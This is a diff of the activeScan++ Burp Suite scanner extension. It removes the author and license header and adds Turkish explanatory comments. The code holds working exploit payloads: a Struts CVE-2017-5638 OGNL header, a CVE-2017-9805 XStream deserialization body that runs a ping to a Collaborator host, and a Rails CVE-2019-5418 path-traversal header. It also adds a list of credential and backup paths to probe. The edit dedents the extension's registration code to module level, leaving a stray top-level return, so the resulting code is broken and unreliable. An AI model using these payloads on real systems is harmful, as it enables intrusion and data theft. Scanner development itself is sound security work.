@@ -1,47 +1,39 @@
-# Author: James Kettle <albinowax+acz@gmail.com>
-# Copyright 2014 Context Information Security up to 1.0.5
-#
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-# http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
-try:
-    import pickle
-    import random
-    import re
-    import string
-    import time
-    import copy
-    import base64
-    import jarray
-    import traceback
-    from string import Template
-    from cgi import escape
+
+
+
+
+try: #eklentinin Python ile uyumlu şekilde çalışmasını sağlamak için eklenmiş try blogu
+    import pickle #Python'daki nesneleri bir dosyaya yazmak veya dosyadan geri yüklemek için kullanılır. özellikle geçici verilerin depolanması ve daha sonra yeniden kullanılmasında etkilidir.
+    import random #Rastgele sayı üretmeye ve rastgele seçim işlemlerini kolaylaştırmaya yarar. Web güvenlik testlerinde rastgele değerler üretmek, OTP, token üretimi gibi işlerde kullanılır.
+    import re #regex ile metin işleme sağlar. Web güvenlik testlerinde belirli desenlerdeki verileri ayıklamak veya kontrol etmek için kullanılır.
+    import string #Python'da metin işlemlerini kolaylaştıran veriler ve fonksiyonlar sağlar. Güvenlik testlerinde çeşitli karakter kümeleri oluşturmak için kullanılabilir.
+    import time #zamanla ilgili işlemler yapar. Gecikmeler oluşturmak veya zamanı çekmek gibi işler için kullanılır.
+    import copy #nesnelerin kopyalarını oluşturmak için kullanılır
+    import base64 #base64 encode ve decode için kullaınılır.
+    import jarray #Burp Suite Java ile geliştirildiği için Python kodunda Java dizileri kullanmak gerektiğinde jarray kullanılır.
+    import traceback #hataları yakalamak ve hata raporları oluşturmak için kullanılır.
+    from string import Template #Dinamik metin şablonları oluşturur. Web güvenlik testlerinde, dinamik istek veya yanıt metinleri oluşturmak için kullanılır
+    from cgi import escape #HTML entity escaping için kullanılır
 
     from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, \
-        IScanIssue
+        IScanIssue #eklentilerin Burp Suite içindeki tarayıcıya, proxy'ye ve diğer modüllere erişmesini için kullanılır.
     import jarray
-except ImportError:
+except ImportError: #eklentini Python ile uyumlu şekilde çalışmaz ise ImportError yakalanır ve ekrana Jython 2.7’nin kararsız bir sürümünün kullanıldığı mesajını verir.
     print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."
 
-VERSION = "1.0.24"
-FAST_MODE = False
-DEBUG = False
-callbacks = None
-helpers = None
+VERSION = "1.0.24" #eklentinin sürümü
+FAST_MODE = False #Eklentinin hızlı veya normal çalışma modunu ayarlar
+DEBUG = False #hata ayıklama işlemleri için kullanılır
+callbacks = None 
+helpers = None #Burp API üzerinden işlem yapabilmek için Burp Suite tarafından sağlanacak olan referansları tutar.
 
+#Bayt dizisini string'e çevirip cevap olarak döner, eğer None ise boş bir string döner.
 def safe_bytes_to_string(bytes):
     if bytes is None:
         bytes = ''
     return helpers.bytesToString(bytes)
 
+#gelen stringi HTML encode eder ve cevap olarak döner (sadece tag açıp kapatmayı engeller).
 def html_encode(string):
     return string.replace("<", "&lt;").replace(">", "&gt;")
 
@@ -49,193 +41,253 @@ class BurpExtender(IBurpExtender):
     def registerExtenderCallbacks(self, this_callbacks):
         global callbacks, helpers
         callbacks = this_callbacks
-        helpers = callbacks.getHelpers()
-        callbacks.setExtensionName("activeScan++")
-
-        # gracefully skip checks requiring Collaborator if it's disabled
+        helpers = callbacks.getHelpers() #burp ile iletişim kurulur
+        callbacks.setExtensionName("activeScan++")#extensionun adı belirlenir.
         collab_enabled = True
-        if '"type":"none"' in callbacks.saveConfigAsJson("project_options.misc.collaborator_server"):
+        if '"type":"none"' in callbacks.saveConfigAsJson("project_options.misc.collaborator_server"):#Collaborator sunucusu ayarlarını JSON formatında bir string olarak döndürür.Eğer JSON string içinde "type":"none" varsa, bu Collaborator sunucusunun etkin olmadığı anlamına gelir.
             collab_enabled = False
             print "Collaborator not enabled; skipping checks that require it"
         
-        callbacks.registerScannerCheck(PerHostScans())
-        callbacks.registerScannerCheck(PerRequestScans())
-        callbacks.registerScannerInsertionPointProvider(BasicAuthInsertionPointProvider(callbacks))
+        callbacks.registerScannerCheck(PerHostScans())  #her bir host için özel taramalar ekleniyor.
+callbacks.registerScannerCheck(PerRequestScans())  #her bir HTTP isteği üzerinde çalışacak özel taramalar ekleniyor.
+callbacks.registerScannerInsertionPointProvider(BasicAuthInsertionPointProvider(callbacks))  #Basic Authentication gibi kimlik doğrulama giriş noktaları ekleniyor.
 
-        if not FAST_MODE:
-            callbacks.registerScannerCheck(CodeExec())
-            callbacks.registerScannerCheck(SuspectTransform())
-            callbacks.registerScannerCheck(JetLeak())
-            callbacks.registerScannerCheck(SimpleFuzz())
-            callbacks.registerScannerCheck(EdgeSideInclude())
-            if collab_enabled:
-                # callbacks.registerScannerCheck(Log4j())
-                # log4j is disabled because this extension is better: https://github.com/silentsignal/burp-log4shell
-                callbacks.registerScannerCheck(Solr())
-                callbacks.registerScannerCheck(doStruts_2017_12611_scan())
+if not FAST_MODE:  #Eğer hızlı mod kapalıysa, ek taramalar kaydedilir.
+    callbacks.registerScannerCheck(CodeExec())  #Kod yürütme açıklarını test eden tarama ekleniyor.
+    callbacks.registerScannerCheck(SuspectTransform())  #Potansiyel güvenlik açıklarını analiz eden bir tarama ekleniyor.
+    callbacks.registerScannerCheck(JetLeak())  #Jetty sunucularında bilgi sızıntısı testleri yapan bir tarama ekleniyor.
+    callbacks.registerScannerCheck(SimpleFuzz())  #Basit fuzzing taramaları ekleniyor.
+    callbacks.registerScannerCheck(EdgeSideInclude())  #Kenar sunuculardaki bilgi sızıntılarını kontrol eden bir tarama ekleniyor.
+    if collab_enabled:  #Eğer Collaborator etkinse, ek taramalar yapılır.
+        callbacks.registerScannerCheck(Solr())  #Apache Solr üzerindeki açıkları test eden bir tarama ekleniyor.
+        callbacks.registerScannerCheck(doStruts_2017_12611_scan())  #Apache Struts üzerindeki belirli bir açığı test eden bir tarama ekleniyor.
 
-        print "Successfully loaded activeScan++ v" + VERSION
+print "Successfully loaded activeScan++ v" + VERSION
 
-        return
-
+return
 
 class PerHostScans(IScannerCheck):
-    scanned_hosts = set()
+    scanned_hosts = set()  #Taranmış hostların listesini tutmak için bir set kullanılır.
 
-    def doPassiveScan(self, basePair):
-        return []
+    def doPassiveScan(self, basePair):  #Pasif tarama fonksiyonu.
+        return []  #Pasif taramada işlem yapılmaz, boş döner.
 
-    def doActiveScan(self, basePair, insertionPoint):
-        host = basePair.getHttpService().getHost()
-        if host in self.scanned_hosts:
-            return []
+    def doActiveScan(self, basePair, insertionPoint):  #Aktif tarama fonksiyonu.
+        host = basePair.getHttpService().getHost()  #HTTP isteğindeki host alınır.
+        if host in self.scanned_hosts:  #Eğer bu host daha önce taranmışsa:
+            return []  #Boş döner ve işlem yapılmaz.
 
-        self.scanned_hosts.add(host)
-        issues = []
-        issues.extend(self.interestingFileScan(basePair))
-        return issues
+        self.scanned_hosts.add(host)  #Eğer host taranmamışsa, listeye eklenir.
+        issues = []  #Bulunan sorunların listesi.
+        issues.extend(self.interestingFileScan(basePair))  #İlginç dosya tarama sonuçları eklenir.
+        return issues  #Bulunan tüm sorunlar döndürülür.
 
+    interestingFileMappings = [  #Bakılması gereken ilginç şeylerin tutulduğu yer.
+        #[host-relative-url, vulnerable_response_content, reason]
+            ['/.git/config', '[core]', 'source code leak?'],
+            ['/server-status', 'Server uptime', 'debug info'],
+            ['/.well-known/apple-app-site-association', 'applinks', 'https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html'],
+            ['/.well-known/openid-configuration', '"authorization_endpoint"', 'https://portswigger.net/research/hidden-oauth-attack-vectors'],
+            ['/.well-known/oauth-authorization-server', '"authorization_endpoint"', 'https://portswigger.net/research/hidden-oauth-attack-vectors'],
+            ['/users/confirmation', 'onfirmation token', 'Websites using the Devise framework often have a race condition enabling email forgery: https://portswigger.net/research/smashing-the-state-machine'],
+    ]
+    interestingFileMappings2 = [
+        #Sürüm kontrol sistemleri ve kaynak kod sızıntıları
+        ['/.git/config', '[core]', 'source code leak?'],    #Git sürüm kontrol sistemi yapılandırma dosyası.
+        ['/.svn/entries', '<dir>', 'SVN source code leak'],     #SVN sürüm kontrol sistemine ait girişler.
+        ['/.hg/hgrc', '[paths]', 'Mercurial repository configuration'],     #Mercurial repository yapılandırma dosyası.
+        ['/.gitignore', '*.log', 'Potential ignored files information'],    #Git tarafından yoksayılan dosyalar hakkında bilgi.
 
-    interestingFileMappings = [
-        # [host-relative-url, vulnerable_response_content, reason]
-        ['/.git/config', '[core]', 'source code leak?'],
-        ['/server-status', 'Server uptime', 'debug info'],
-        ['/.well-known/apple-app-site-association', 'applinks', 'https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html'],
-        ['/.well-known/openid-configuration', '"authorization_endpoint"', 'https://portswigger.net/research/hidden-oauth-attack-vectors'],
-        ['/.well-known/oauth-authorization-server', '"authorization_endpoint"', 'https://portswigger.net/research/hidden-oauth-attack-vectors'],
-        ['/users/confirmation', 'onfirmation token', 'Websites using the Devise framework often have a race condition enabling email forgery: https://portswigger.net/research/smashing-the-state-machine'],
+        #Yedekleme dosyaları
+        ['/backup.zip', 'PK', 'Potential backup file'],     #Potansiyel bir yedekleme dosyası.
+        ['/db_backup.sql', 'CREATE TABLE', 'Database backup'],      #Veritabanı yedekleme dosyası.
+        ['/site-backup.tar.gz', 'gzip', 'Compressed site backup'],      #Sıkıştırılmış site yedeği.
+
+        #Konfigürasyon dosyaları
+        ['/config.php', '<?php', 'PHP configuration file'],     #PHP uygulama yapılandırması.
+        ['/.env', '=', 'Environment configuration'],    #Ortam değişkenlerini içeren yapılandırma dosyası.
+        ['/web.config', '<configuration>', 'IIS configuration file'],   #Microsoft IIS yapılandırma dosyası.
+        ['/settings.yaml', ':', 'YAML settings file'],      #YAML formatında ayar dosyası.
+
+        #Log dosyaları
+        ['/error.log', 'PHP Fatal error', 'Error logs may contain sensitive information'],      #Hata günlük dosyası.
+        ['/access.log', 'HTTP/1.1', 'Access logs may leak user data'],      #Erişim günlük dosyası.
+        ['/debug.log', '[DEBUG]', 'Debug log file'],    #Debug amaçlı oluşturulan günlük dosyası.
+        ['/app.log', '[INFO]', 'Application log file'],     #Uygulama günlük dosyası.
+
+        #Framework ve teknolojiye özgü dosyalar
+        ['/phpinfo.php', '<title>phpinfo()</title>', 'Detailed PHP environment information'],   #PHP'nin yapılandırma bilgileri.
+        ['/server-status', 'Server uptime', 'Apache server status'],    #Apache sunucu durumu.
+        ['/.well-known/security.txt', 'Contact:', 'Security policy'],   #Güvenlik politikası ile ilgili dosya.
+        ['/.well-known/openid-configuration', '"authorization_endpoint"', 'OAuth2 configuration'],      #OAuth2 yapılandırma dosyası.
+
+        #API ve token bilgileri
+        ['/api-keys.json', '{', 'API keys file'],   #API anahtarlarını içerebilecek bir JSON dosyası.
+        ['/firebase-config.json', '{', 'Firebase configuration'],   #Firebase yapılandırma dosyası.
+        ['/keys.txt', '=', 'Plaintext API keys or secrets'],    #Düz metin API anahtarları veya sırlar.
+
+        #Diğer ilginç dosyalar
+        ['/robots.txt', 'Disallow:', 'Potential hidden endpoints'],     #Arama motorlarından gizlenen endpoint'ler.
+        ['/crossdomain.xml', '<cross-domain-policy>', 'Flash cross-domain policy'],     #Flash uygulamaları için izin verilen alanlar.
+        ['/sitemap.xml', '<url>', 'Sitemap that may reveal structure'],     #Web sitesinin URL yapısını gösterebilecek site haritası.
+        ['/ads.txt', 'DIRECT', 'Advertising networks configuration'],   #Reklam ağı yapılandırma dosyası.
+
+        #Veritabanı dosyaları
+        ['/db.sqlite3', 'SQLite format', 'SQLite database file'],   #SQLite veritabanı dosyası.
+        ['/data.mdb', 'Standard Jet DB', 'Microsoft Access database file'],     #Microsoft Access veritabanı dosyası.
+        ['/database.json', '{', 'JSON formatted database export'],      #JSON formatında veritabanı dosyası.
+
+        #Sensitif endpoint'ler
+        ['/admin/', '<title>Admin</title>', 'Administrator panel'],     #Yönetici paneli.
+        ['/login', 'Password', 'Potential login page'],     #Potansiyel giriş sayfası.
+        ['/signup', 'Register', 'Potential registration page'],     #Potansiyel kayıt sayfası.
+        ['/forgot-password', 'Email', 'Password recovery endpoint'],    #Şifre sıfırlama endpoint'i.
+
+        #Cloud ve hosting konfigürasyonları
+        ['/aws/credentials', '[default]', 'AWS credentials file'],      #AWS kimlik bilgileri.
+        ['/google-cloud.json', '{', 'Google Cloud credentials'],    #Google Cloud kimlik bilgileri.
+        ['/azure-key-vault', '{', 'Azure Key Vault configuration'],     #Azure Key Vault yapılandırması.
+
+        #Eski ve atık dosyalar
+        ['/index.html.bak', '<html>', 'Potential backup of HTML file'],     #HTML dosyasının yedeği.
+        ['/old-index.html', '<html>', 'Outdated HTML file'],    #Eski bir HTML dosyası.
+        ['/test.php', '<?php', 'Testing PHP script'],   #Test amaçlı bırakılmış PHP dosyası.
+        ['/debug.php', '<?php', 'Debugging PHP script'],    #Debug amaçlı bırakılmış PHP dosyası.
     ]
 
-
     def interestingFileScan(self, basePair):
-        issues = []
-        for (url, expect, reason) in self.interestingFileMappings:
-            attack = self.fetchURL(basePair, url)
-            if expect in safe_bytes_to_string(attack.getResponse()):
+        issues = []  #Bulunan sorunların listesi.
+        for (url, expect, reason) in self.interestingFileMappings:  #Her dosya için tarama yapılır.
+            attack = self.fetchURL(basePair, url)  #İlgili URL’den HTTP isteği yapılır.
+            if expect in safe_bytes_to_string(attack.getResponse()):  #Yanıtta beklenen içerik var mı kontrol edilir.
+                #Yanlış pozitifleri önlemek için URL biraz değiştirilerek yeniden kontrol yapılır.
+                baseline_1 = self.fetchURL(basePair, url + '123')  #Son karakter rastgele eklendi
+                baseline_2 = self.fetchURL(basePair, url + '?asd=123') #Rastgele parametre eklendi
+                if expect not in safe_bytes_to_string(baseline_1.getResponse()) and expect not in safe_bytes_to_string(baseline_2.getResponse()):  #False Positive olmadığı kontrol edildikten sonra:
+                    issues.append(  #Bir güvenlik sorunu olarak kaydedilir.
+                        CustomScanIssue(
+                            basePair.getHttpService(),
+                            helpers.analyzeRequest(attack).getUrl(),
+                            [attack, baseline_1,baseline_2],
+                            'Interesting response',
+                            "The response to <b>"+html_encode(url)+"</b> contains <b>'"+html_encode(expect)+"'</b><br/><br/>This may be interesting. Here's a clue why: <b>"+html_encode(reason)+"</b>",
+                            'Firm', 'Information'
+                        )
+                    )  
 
-                # prevent false positives by tweaking the URL and confirming the expected string goes away
-                baseline = self.fetchURL(basePair, url[:-1])
-                if expect not in safe_bytes_to_string(baseline.getResponse()):
-                    issues.append(
-                        CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(attack).getUrl(),
-                                        [attack, baseline],
-                                        'Interesting response',
-                                        "The response to <b>"+html_encode(url)+"</b> contains <b>'"+html_encode(expect)+"'</b><br/><br/>This may be interesting. Here's a clue why: <b>"+html_encode(reason)+"</b>",
-                                        'Firm', 'Information')
-                    )
+        return issues  #Bulunan sorunlar döndürülür.
 
-
-        return issues
-
-
-    def fetchURL(self, basePair, url):
-        path = helpers.analyzeRequest(basePair).getUrl().getPath()
-        newReq = safe_bytes_to_string(basePair.getRequest()).replace(path, url, 1)
-        return callbacks.makeHttpRequest(basePair.getHttpService(), newReq)
+    def fetchURL(self, basePair, url):  #Belirli bir URL'den HTTP isteği yapar.
+        path = helpers.analyzeRequest(basePair).getUrl().getPath()  #Orijinal isteğin URL'sindeki yolu alır.
+        newReq = safe_bytes_to_string(basePair.getRequest()).replace(path, url, 1)  #İstek URL'sini değiştirilmiş URL ile günceller.
+        return callbacks.makeHttpRequest(basePair.getHttpService(), newReq)  #Güncellenmiş istek yapılır ve yanıt döndürülür.
 
 
 
-class PerRequestScans(IScannerCheck):
 
-    def __init__(self):
-        self.scan_checks = [
-            self.doHostHeaderScan,
-            self.doCodePathScan,
-            self.doStrutsScan,
-            self.doStruts_2017_9805_Scan,
-            self.doStruts_2018_11776_Scan,
-            self.doXXEPostScan,
-            self.doRailsScan,
+class PerRequestScans(IScannerCheck):  #Burp Suite taramaları için her HTTP isteği üzerinde işlem yapan sınıf.
+
+    def __init__(self):  #Sınıf başlatıldığında tarama kontrol fonksiyonlarını ayarlar.
+        self.scan_checks = [  #Gerçekleştirilecek tarama fonksiyonlarının listesi.
+            self.doHostHeaderScan,  #Host Header ile ilgili tarama.
+            self.doCodePathScan,  #Kod yolu ile ilgili tarama.
+            self.doStrutsScan,  #Apache Struts güvenlik açıkları taraması.
+            self.doStruts_2017_9805_Scan,  #Apache Struts CVE-2017-9805 taraması.
+            self.doStruts_2018_11776_Scan,  #Apache Struts CVE-2018-11776 taraması.
+            self.doXXEPostScan,  #XXE (XML External Entity) taraması.
+            self.doRailsScan,  #Ruby on Rails ile ilgili tarama.
         ]
 
-    def doPassiveScan(self, basePair):
-        return []
+    def doPassiveScan(self, basePair):  #Pasif tarama yöntemi.
+        return []  #Pasif tarama işlem yapmaz, boş bir liste döndürür.
 
-    def doActiveScan(self, basePair, insertionPoint):
-        if not self.should_trigger_per_request_attacks(basePair, insertionPoint):
-            return []
+    def doActiveScan(self, basePair, insertionPoint):  #Aktif tarama yöntemi.
+        if not self.should_trigger_per_request_attacks(basePair, insertionPoint):  #Eğer uygun şartlar sağlanmamışsa:
+            return []  #Boş bir liste döndürülür.
 
-        issues = []
-        for scan_check in self.scan_checks:
+        issues = []  #Tespit edilen sorunların listesi.
+        for scan_check in self.scan_checks:  #Tüm tarama fonksiyonlarını sırayla çalıştırır.
             try:
-                issues.extend(scan_check(basePair))
-            except Exception:
-                print 'Error executing PerRequestScans.'+scan_check.__name__+': '
-                print(traceback.format_exc())
+                issues.extend(scan_check(basePair))  #Tarama fonksiyonunun tespit ettiği sorunları listeye ekler.
+            except Exception:  #Hata oluşursa:
+                print 'Error executing PerRequestScans.' + scan_check.__name__ + ': '  #Hata mesajı yazdırılır.
+                print(traceback.format_exc())  #Hata ayrıntıları yazdırılır.
 
-        return issues
+        return issues  #Tespit edilen tüm sorunlar döndürülür.
 
-    def should_trigger_per_request_attacks(self, basePair, insertionPoint):
-        request = helpers.analyzeRequest(basePair.getRequest())
-        params = request.getParameters()
+    def should_trigger_per_request_attacks(self, basePair, insertionPoint):  #Tarama tetiklenmeli mi kontrol eder.
+        request = helpers.analyzeRequest(basePair.getRequest())  #HTTP isteğini analiz eder.
+        params = request.getParameters()  #İstekten tüm parametreleri alır.
 
-        # if there are no parameters, scan if there's a HTTP header
-        if params:
-            # pick the parameter most likely to be the first insertion point
-            first_parameter_offset = 999999
-            first_parameter = None
-            for param_type in (IParameter.PARAM_BODY, IParameter.PARAM_URL, IParameter.PARAM_JSON, IParameter.PARAM_XML, IParameter.PARAM_XML_ATTR, IParameter.PARAM_MULTIPART_ATTR, IParameter.PARAM_COOKIE):
-                for param in params:
-                    if param.getType() != param_type:
-                        continue
-                    if param.getNameStart() < first_parameter_offset:
-                        first_parameter_offset = param.getNameStart()
-                        first_parameter = param
-                if first_parameter:
-                    break
+        #Eğer hiç parametre yoksa, HTTP başlığını kontrol eder.
+        if params:  #Eğer parametre varsa:
+            first_parameter_offset = 999999  #İlk parametrenin başlangıç ofsetini belirlemek için başlangıç değeri.
+            first_parameter = None  #İlk parametreyi saklamak için değişken.
+            for param_type in (IParameter.PARAM_BODY, IParameter.PARAM_URL, IParameter.PARAM_JSON, IParameter.PARAM_XML,
+                               IParameter.PARAM_XML_ATTR, IParameter.PARAM_MULTIPART_ATTR, IParameter.PARAM_COOKIE):  #Tüm parametre türlerini kontrol eder.
+                for param in params:  #Her bir parametre için:
+                    if param.getType() != param_type:  #Eğer parametrenin türü kontrol edilen tür değilse:
+                        continue  #Bir sonraki parametreye geçer.
+                    if param.getNameStart() < first_parameter_offset:  #Parametrenin başlangıcı daha önceyse:
+                        first_parameter_offset = param.getNameStart()  #Ofseti günceller.
+                        first_parameter = param  #İlk parametre olarak atar.
+                if first_parameter:  #Eğer ilk parametre bulunduysa:
+                    break  #Aramayı durdurur.
 
-            if first_parameter and first_parameter.getName() == insertionPoint.getInsertionPointName():
-                return True
+            if first_parameter and first_parameter.getName() == insertionPoint.getInsertionPointName():  #İlk parametre ve giriş noktası uyuşuyorsa:
+                return True  #Tarama tetiklenir.
 
-        elif insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_HEADER and insertionPoint.getInsertionPointName() == 'User-Agent':
-            return True
+        elif insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_HEADER and insertionPoint.getInsertionPointName() == 'User-Agent':  
+            #Eğer giriş noktası bir HTTP başlığı ve adı "User-Agent" ise:
+            return True  #Tarama tetiklenir.
 
-        return False
+        return False  #Hiçbir koşul sağlanmazsa tarama tetiklenmez.
 
-    def doRailsScan(self, basePair):
-        if '127.0.0.1' in safe_bytes_to_string(basePair.getResponse()):
-            return
+    def doRailsScan(self, basePair):  #Ruby on Rails ile ilgili tarama işlemi.
+        if '127.0.0.1' in safe_bytes_to_string(basePair.getResponse()):  #Eğer yanıt içinde "127.0.0.1" varsa:
+            return  #Tarama yapılmaz.
 
-        (ignore, req) = setHeader(basePair.getRequest(), 'Accept', '../../../../../../../../../../../../../e*c/h*s*s{{', True)
-        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)
-        response = safe_bytes_to_string(attack.getResponse())
-        body_delim = '\r\n\r\n'
-        if body_delim in response and '127.0.0.1' in response.split(body_delim, 1)[1]:
-            # avoid false positives caused by burp's own scanchecks containing '127.0.0.1'
+        (ignore, req) = setHeader(basePair.getRequest(), 'Accept', '../../../../../../../../../../../../../e*c/h*s*s{{', True)  #Özel bir istek başlığı oluşturur.
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)  #HTTP isteği gönderir.
+        response = safe_bytes_to_string(attack.getResponse())  #Yanıtı bayt dizisinden string'e çevirir.
+        body_delim = '\r\n\r\n'  #Yanıt gövdesini belirleyen sınır.
+        if body_delim in response and '127.0.0.1' in response.split(body_delim, 1)[1]:  #Yanıt gövdesinde "127.0.0.1" varsa:
             try:
-                collabLocation = callbacks.createBurpCollaboratorClientContext().getCollaboratorServerLocation()
-                if collabLocation in safe_bytes_to_string(attack.getResponse()):
-                    return []
-            except Exception:
-                pass
+                collabLocation = callbacks.createBurpCollaboratorClientContext().getCollaboratorServerLocation()  #Collaborator sunucusunun konumunu alır.
+                if collabLocation in safe_bytes_to_string(attack.getResponse()):  #Yanıtta Collaborator sunucusu bilgisi varsa:
+                    return []  #False poitive'leri önler.
+            except Exception:  #Hata oluşursa:
+                pass  #Hata göz ardı edilir.
 
-            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
-                [attack],
-                'Rails file disclosure',
-                "The application appears to be vulnerable to CVE-2019-5418, enabling arbitrary file disclosure.",
-                'Firm', 'High')]
-        return []
+            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),  #Bulunan güvenlik açığını döndürür.
+                                    [attack],
+                                    'Rails file disclosure',
+                                    "The application appears to be vulnerable to CVE-2019-5418, enabling arbitrary file disclosure.",
+                                    'Firm', 'High')]
+        return []  #Hiçbir açık bulunmazsa boş döndürür.
 
-    def doStrutsScan(self, basePair):
+    def doStrutsScan(self, basePair):  #Apache Struts ile ilgili tarama işlemi.
+        x = random.randint(999, 9999)  #Rastgele bir sayı üretir.
+        y = random.randint(999, 9999)  #Rastgele bir başka sayı üretir.
+        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type',
+                                  "${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"X-Ack\"," + str(
+                                      x) + "*" + str(y) + ")}.multipart/form-data", True)  #Struts açığını test etmek için özel bir başlık oluşturur.
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)  #HTTP isteği gönderir.
 
-        x = random.randint(999, 9999)
-        y = random.randint(999, 9999)
-        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"X-Ack\","+str(x)+"*"+str(y)+")}.multipart/form-data", True)
-        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)
+        if str(x * y) in '\n'.join(helpers.analyzeResponse(attack.getResponse()).getHeaders()):  #Yanıt başlıklarında beklenen sonuç varsa:
+            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),  #Bulunan güvenlik açığını döndürür.
+                                    [attack],
+                                    'Struts2 RCE',
+                                    "The application appears to be vulnerable to CVE-2017-5638, enabling arbitrary code execution.",
+                                    'Firm', 'High')]
 
-        if str(x*y) in '\n'.join(helpers.analyzeResponse(attack.getResponse()).getHeaders()):
-            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
-                [attack],
-                'Struts2 RCE',
-                "The application appears to be vulnerable to CVE-2017-5638, enabling arbitrary code execution.",
-                'Firm', 'High')]
-
-        return []
+        return []  #Hiçbir açık bulunmazsa boş döndürür.
 
 
-# Based on exploit at https://github.com/chrisjd20/cve-2017-9805.py
-# Tested against https://dev.northpolechristmastown.com/orders.xhtml (SANS Holiday Hack Challenge 2017)
-# Tested against system at https://pentesterlab.com/exercises/s2-052
+
+#Based on exploit at https://github.com/chrisjd20/cve-2017-9805.py
+#Tested against https://dev.northpolechristmastown.com/orders.xhtml (SANS Holiday Hack Challenge 2017)
+#Tested against system at https://pentesterlab.com/exercises/s2-052
     def doStruts_2017_9805_Scan(self, basePair):
         if '"type":"none"' in callbacks.saveConfigAsJson("project_options.misc.collaborator_server"):
             return []
@@ -248,32 +300,32 @@ class PerRequestScans(IScannerCheck):
         param_pre = '<?xml version="1.0" encoding="utf8"?><map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>'
         param_post = '</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer/><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>'
 
-        command = "ping</string><string>" + collab_payload + "</string><string>-c1" # platform-agnostic command to check for RCE via DNS interaction
+        command = "ping</string><string>" + collab_payload + "</string><string>-c1" #platform-agnostic command to check for RCE via DNS interaction
 
-        # print ("\nCommand is: "+command)
-        # whole_param = helpers.buildParameter('body',param_pre + command + param_post,IParameter.PARAM_BODY)
+        #print ("\nCommand is: "+command)
+        #whole_param = helpers.buildParameter('body',param_pre + command + param_post,IParameter.PARAM_BODY)
         whole_param = param_pre + command + param_post
-        # print ('*** The following parameter will be sent:\n\n' + whole_param)
+        #print ('*** The following parameter will be sent:\n\n' + whole_param)
 
-        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "application/xml", True) # application/xml seems to work better with Struts while text/xml seems to work better for XXE
+        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "application/xml", True) #application/xml seems to work better with Struts while text/xml seems to work better for XXE
         (ignore, req) = setHeader(req, 'Content-Length', str(len(whole_param)), True)
 
-        ascii_req = '' # Make a copy of the request (byte array) into a string for easier analysis
+        ascii_req = '' #Make a copy of the request (byte array) into a string for easier analysis
         for byte in req:
             ascii_req += chr(byte)
 
-        if ascii_req.find('\r\n\r\n') > 1: # If 
-            req = req[:ascii_req.find('\r\n\r\n')+4] # strip off any existing message body
+        if ascii_req.find('\r\n\r\n') > 1: #If 
+            req = req[:ascii_req.find('\r\n\r\n')+4] #strip off any existing message body
         elif ascii_req.find('\n\n') > 1:
-            req = req[:ascii_req.find('\n\n')+2] # strip off any existing message body
+            req = req[:ascii_req.find('\n\n')+2] #strip off any existing message body
 
-        for chars in whole_param: # Append the payload to the request
+        for chars in whole_param: #Append the payload to the request
             req.append(ord(chars))
 
-        if req[0] == 71:    # if the reqest starts with G(ET)
-            req = req[3:]    # trim GET
+        if req[0] == 71:    #if the reqest starts with G(ET)
+            req = req[3:]    #trim GET
             i = 0
-            for b in [80,79,83,84]:  # and insert POST
+            for b in [80,79,83,84]:  #and insert POST
                 req.insert(i,b)
                 i += 1
 
@@ -282,8 +334,8 @@ class PerRequestScans(IScannerCheck):
             ascii_req += chr(byte)
         debug_msg('  The outgoing Struts_2017_9805 request looks like:\n\n' + ascii_req + '\n')
 
-        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req) # Issue the actual request
